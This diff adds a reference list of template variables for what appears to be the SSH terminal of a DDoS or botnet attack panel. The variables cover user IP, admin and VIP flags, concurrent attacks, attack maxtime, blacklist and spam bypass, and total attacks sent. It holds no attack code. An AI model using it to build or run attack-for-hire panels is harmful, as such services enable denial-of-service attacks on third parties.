@@ -1,0 +1,21 @@
+[8;20;81t  
+<<$clear>>
+
+<<$user.Username>> - logged-in username
+<<$user.IP>> - logged-in user's IP address
+<<$user.Admin>> - User's Admin status (true/false)
+<<$user.Vip>> - User's Vip status (true/false)
+<<$user.Private>> - User's Private status (true/false)
+<<$user.Raw>> - User's Private status (true/false)
+<<$user.Expiry>> - User's expiry date
+<<$user.Concurrents>> - User's councurrents
+<<$user.Cooldown>> - User's Cooldown (in seconds)
+<<$user.Maxtime>> - User's maxtime (in seconds)
+<<$user.Api_access>> - User's api access status (true/false)
+<<$user.Power_saving_bypass>> - User's power saving bypass status (true/false)
+<<$user.Spam_bypass>> - User's spam bypass status (true/false)
+<<$user.Blacklist_bypass>> - User's blacklist bypass status (true/false)
+<<$user.SSH_Client>> - User's ssh client
+<<$user.Kilza>> - User's Kilza status (true/false)
+<<$user.Created_by>> - account creator
+<<$user.Total_attacks>> - total attacks sent by this user
